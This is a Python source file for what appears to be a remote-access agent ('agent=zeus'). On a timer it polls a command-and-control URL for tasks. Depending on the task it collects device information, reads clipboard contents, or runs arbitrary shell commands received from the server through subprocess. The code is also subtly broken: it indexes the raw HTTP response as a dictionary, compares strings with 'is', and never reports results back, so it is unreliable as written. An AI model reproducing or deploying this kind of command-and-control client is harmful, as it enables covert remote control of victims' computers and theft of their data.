#!/usr/local/bin/python

try:
    import urllib.request as requests
except ImportError:
    import urllib2 as requests

import threading

from Providers.DeviceInfoProvider import DeviceInfoProvider

class TaskManagmentHandler():
    # Handle tasks from server

    NUMBER_OF_SECOND_IN_MINUTES = 60

    MINUTES_TO_FIRST_TASK = 5 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_NORMAL_TASK = 20 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_FAILED_TASK = 20 * NUMBER_OF_SECOND_IN_MINUTES

    global currentAwaitingTime
    currentAwaitingTime = MINUTES_TO_FIRST_TASK

    def startTask(self):
        taskThread = threading.Timer(self.MINUTES_TO_FIRST_TASK, self.executeTaskFromServer)
        taskThread.start()

    def executeTaskFromServer(self):
        taskResponse = requests.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus&deviceID=xxxx").read()

        if taskResponse["task"]:
            if len(taskResponse["task"]) > 0:
                self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK

                if taskResponse["task"] is "deviceInfo":
                    # Get device info
                    devInfoProvider = DeviceInfoProvider()
                    deviceInfoDict = devInfoProvider.getDeviceInfo()
                    pass
                elif taskResponse["task"] is "screenshot":
                    # Take screenshot
                    pass
                elif taskResponse["task"] is "clipboard":
                    # Get clipboard data
                    devInfoProvider = DeviceInfoProvider()
                    clipboardData = devInfoProvider.getClipboardData()
                elif taskResponse["task"] is "terminal":
                    import  subprocess

                    if taskResponse["data"]:
                        if len(taskResponse["data"]) > 0:
                            command = taskResponse["data"]
                            terminalOutput = subprocess.check_output(command).decode("UTF-8")
        else:
            self.currentAwaitingTime = self.MINUTES_TO_FAILED_TASK

        taskThread = threading.Timer(self.currentAwaitingTime, self.executeTaskFromServer)
        taskThread.start()


if __name__ == "__main__":
    taskMgr = TaskManagmentHandler()
    taskMgr.startTask()
